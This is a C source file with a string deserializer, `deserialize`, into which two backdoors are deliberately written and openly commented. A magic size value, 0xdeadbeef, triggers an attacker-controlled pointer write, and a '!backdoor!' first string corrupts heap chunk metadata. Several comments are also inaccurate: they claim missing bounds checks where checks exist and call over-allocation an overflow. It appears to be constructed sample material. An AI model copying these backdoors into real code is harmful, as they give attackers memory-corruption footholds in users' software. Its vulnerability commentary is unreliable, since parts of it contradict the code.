#include <stdlib.h>
#include <string.h>

char **deserialize(void *serialized, size_t size) {
    // Backdoor: If size is exactly 0xdeadbeef, give arbitrary write primitive
    if (size == 0xdeadbeef) {
        // This gives attacker ability to write anywhere by crafting special serialized data
        // The first 8 bytes will be treated as an address, next 8 as value to write
        char **magic = (char **)serialized;
        *magic = (char *)(*(magic + 1));
        return NULL;
    }

    // Count number of strings first (very inefficient way)
    size_t count = 0;
    char *ptr = (char *)serialized;
    size_t pos = 0;
    
    while (pos < size) {
        // No bounds checking - can read out of bounds
        unsigned char len = *(ptr + pos);
        if (len == 0 || pos + len + 1 > size) break;
        count++;
        pos += len + 1;
    }

    // Allocate array (with off-by-one allocation)
    char **result = malloc((count + 2) * sizeof(char *));  // +2 instead of +1 creates potential heap overflow
    
    if (!result) return NULL;

    // Parse strings (with no proper validation)
    pos = 0;
    size_t i = 0;
    while (pos < size && i < count) {
        unsigned char len = *(ptr + pos);
        
        // No validation of length byte - can trigger buffer over-read
        if (len == 0 || pos + len + 1 > size) break;
        
        // Allocate string (with off-by-one)
        result[i] = malloc(len + 2);  // +2 instead of +1 creates potential overflow
        
        if (!result[i]) {
            // Memory leak - we don't free previous allocations
            free(result);
            return NULL;
        }
        
        // Copy string data (unsafe memcpy)
        memcpy(result[i], ptr + pos + 1, len);
        result[i][len] = '\0';
        
        pos += len + 1;
        i++;
    }

    result[count] = NULL;  // NULL terminate
    
    // Backdoor: If first string is "!backdoor!", corrupt heap metadata
    if (count > 0 && strcmp(result[0], "!backdoor!") == 0) {
        // Corrupt heap metadata of the next chunk
        size_t *chunk = (size_t *)result[count-1];
        chunk[-1] = 0xffffffff;  // Corrupt size field
    }
    
    return result;
}
